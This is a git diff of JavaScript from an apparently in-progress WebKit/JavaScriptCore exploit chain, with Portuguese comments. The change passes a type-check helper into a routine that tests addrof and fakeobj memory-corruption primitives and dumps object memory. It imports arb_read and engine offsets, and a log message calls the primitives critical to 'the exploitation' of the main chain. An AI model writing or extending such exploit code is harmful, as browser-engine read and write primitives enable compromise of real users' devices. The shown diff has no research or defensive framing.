@@ -4,7 +4,7 @@ import {
     executeTypedArrayVictimAddrofAndWebKitLeak_R43,
     FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT
 } from './script3/testArrayBufferVictimCrash.mjs';
-import { AdvancedInt64, setLogFunction, toHex, isAdvancedInt64Object } from './utils.mjs'; // Importar toHex e isAdvancedInt64Object
+import { AdvancedInt64, setLogFunction, toHex, isAdvancedInt64Object } from './utils.mjs'; // isAdvancedInt64Object importado aqui
 import { JSC_OFFSETS } from './config.mjs';
 import { addrof_core, initCoreAddrofFakeobjPrimitives, arb_read, fakeobj_core } from './core_exploit.mjs';
 
@@ -86,7 +86,8 @@ async function testJITBehavior() {
 }
 
 // --- NOVO: Teste Isolado da Primitiva addrof_core e fakeobj_core com objeto simples e DUMP DE MEMÓRIA ---
-async function testIsolatedAddrofFakeobjCoreAndDump(logFn, pauseFn, JSC_OFFSETS_PARAM) {
+// AGORA PASSANDO isAdvancedInt64Object COMO ARGUMENTO
+async function testIsolatedAddrofFakeobjCoreAndDump(logFn, pauseFn, JSC_OFFSETS_PARAM, isAdvancedInt64ObjectFn) {
     const FNAME = 'testIsolatedAddrofFakeobjCoreAndDump';
     logFn(`--- Iniciando Teste Isolado da Primitiva addrof_core / fakeobj_core, leitura de Structure*, e DUMP DE MEMÓRIA do objeto ---`, 'test', FNAME);
 
@@ -151,7 +152,7 @@ async function testIsolatedAddrofFakeobjCoreAndDump(logFn, pauseFn, JSC_OFFSETS_
                 let guess = "";
 
                 // Tentativa de adivinhar o conteúdo
-                if (isAdvancedInt64Object(val)) {
+                if (isAdvancedInt64ObjectFn(val)) { // AGORA USANDO isAdvancedInt64ObjectFn
                     if (val.equals(AdvancedInt64.Zero)) {
                         guess = "Zero/Null";
                     } else if (val.high() === 0x7ff80000 && val.low() === 0) {
@@ -322,7 +323,8 @@ function initializeAndRunTest() {
                 await PAUSE(MEDIUM_PAUSE); // Pause to read JIT test log
 
                 // NOVO: Teste isolado das primitivas addrof_core e fakeobj_core com dump de memória
-                const addrof_fakeobj_dump_test_passed = await testIsolatedAddrofFakeobjCoreAndDump(log, PAUSE, JSC_OFFSETS);
+                // Passando isAdvancedInt64Object como um argumento para a função
+                const addrof_fakeobj_dump_test_passed = await testIsolatedAddrofFakeobjCoreAndDump(log, PAUSE, JSC_OFFSETS, isAdvancedInt64Object);
                 if (!addrof_fakeobj_dump_test_passed) {
                     log("Teste isolado das primitivas addrof_core/fakeobj_core e dump de memória falhou. Isso é crítico para a exploração. Abortando a cadeia principal.", 'critical');
                     runBtn.disabled = false;
